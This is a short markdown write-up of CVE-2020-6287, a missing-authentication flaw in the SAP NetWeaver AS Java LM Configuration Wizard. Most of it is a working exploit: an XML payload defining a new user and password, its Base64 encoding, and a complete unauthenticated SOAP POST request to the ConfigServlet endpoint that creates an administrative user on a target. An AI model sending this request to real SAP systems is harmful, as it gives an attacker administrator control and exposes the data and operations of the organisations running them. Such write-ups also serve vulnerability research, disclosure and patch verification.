cves/CVE-2020-6287.md


# Title

   SAP NetWeaver AS JAVA (LM Configuration Wizard), versions - 7.30, 7.31, 7.40, 7.50, does not perform an authentication check which allows an attacker without prior authentication to execute configuration tasks to perform critical actions against the SAP Java system, including the ability to create an administrative user.

## Steps To Reproduce

Payload
We are going to use this payload encoded in Base64. 
```
<root><user><JavaOrABAP>java</JavaOrABAP><username>poccveusername</username><password>ThIsIsAPaSSW0Rd1234</password><userType></userType></user></root>
```
In Base64:
```
PHJvb3Q+PHVzZXI+PEphdmFPckFCQVA+amF2YTwvSmF2YU9yQUJBUD48dXNlcm5hbWU+cG9jY3Zl
dXNlcm5hbWU8L3VzZXJuYW1lPjxwYXNzd29yZD5UaElzSXNBUGFTU1cwUmQxMjM0PC9wYXNzd29y
ZD48dXNlclR5cGU+PC91c2VyVHlwZT48L3VzZXI+PC9yb290Pgo=
```

Request
Let's use the encoded payload inside <baData></baData>
```
POST /CTCWebService/CTCWebServiceBean/ConfigServlet HTTP/1.1
Host: $DOMAIN
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
Content-Length: 658
Connection: close
Content-Type: text/xml; charset=UTF-8
Accept-Encoding: gzip

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CTCWebServiceSi"><soapenv:Header/><soapenv:Body><urn:executeSynchronious><identifier><component>sap.com/tc~lm~config~content</component><path>content/Netweaver/ASJava/NWA/SPC/SPC_UserManagement.cproc</path></identifier><contextMessages><baData>PHJvb3Q+PHVzZXI+PEphdmFPckFCQVA+amF2YTwvSmF2YU9yQUJBUD48dXNlcm5hbWU+cG9jY3Zl
dXNlcm5hbWU8L3VzZXJuYW1lPjxwYXNzd29yZD5UaElzSXNBUGFTU1cwUmQxMjM0PC9wYXNzd29y
ZD48dXNlclR5cGU+PC91c2VyVHlwZT48L3VzZXI+PC9yb290Pgo=</baData><name>userDetails</name></contextMessages></urn:executeSynchronious></soapenv:Body></soapenv:Envelope>

```


## Impact
An attacker can create an admin user, therefore compromising Confidentiality, Integrity and Availability of the system, leading to a Missing Authentication Check.

 
### Supporting Material/References



